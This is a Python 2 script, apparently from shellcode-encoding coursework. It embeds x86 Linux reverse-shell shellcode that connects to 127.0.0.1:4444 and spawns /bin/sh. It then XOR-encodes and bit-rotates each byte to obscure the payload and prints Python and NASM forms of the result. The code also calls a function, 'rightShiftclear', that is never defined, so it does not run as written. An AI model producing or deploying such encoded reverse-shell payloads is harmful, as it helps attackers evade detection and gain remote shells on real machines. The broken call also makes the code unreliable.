import random

final = ""

def numForXor():
	randomInt = random.randint(1,255)
	return randomInt

def rightShift(val, rot):
	return ((val & 0xff) >> rot % 8 ) | (val << ( 8 - (rot % 8)) & 0xff)

shellcode = ("\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x31\xf6\x56\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\xb0\x66\xb3\x03\x56\xb9\x84\x05\x05\x06\x81\xe9\x05\x05\x05\x05\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x3f\x89\xd3\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\xb0\x0b\x31\xf6\x56\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xcd\x80")

print "\n  /------------------------/"
print " *  Advanced XOR Encoder  *"
print "/------------------------/"

print "\nStructure: {shellcode XOR randint result} {randint} {shellcode XOR randint result} {randint} [..] \n"
print "\t-------------------------------------------------"
print "\t| Byte    Operation   RandInt \t      \tResult  |"
print "\t-------------------------------------------------"

for x in bytearray(shellcode):
	chosen = numForXor()

	# In case of NULL Byte (it happens, when both same values are xored, e.g. 0x5 xor 0x5 = 0x00)
	if hex(x) == hex(chosen): 
		chosen = numForXor()

	print "\t| \\x%x\t     xor       \\x%x\t  =      \\x%x\t|" % (x, chosen, x ^ chosen)

	x = rightShiftclear((x ^ chosen),3)

	# Appending byte from shellcode
	final = final + "\\x%02x" % x

	# Appending byte which was used for xoring
	final = final + "\\x%02x" % chosen

print "\t-------------------------------------------------"
print "\nShellcode length: %s\n" % len(shellcode)

print "Python version of encoded shellcode: \n" + 100 * "-" + "\n%s " % final
print 100 * "-"


nasm = final.replace('\\x',',0x')

print "\nNASM version of encoded shellcode: \n" + 100 * "-" + "\n%s " % nasm[1:]
print 100 * "-"
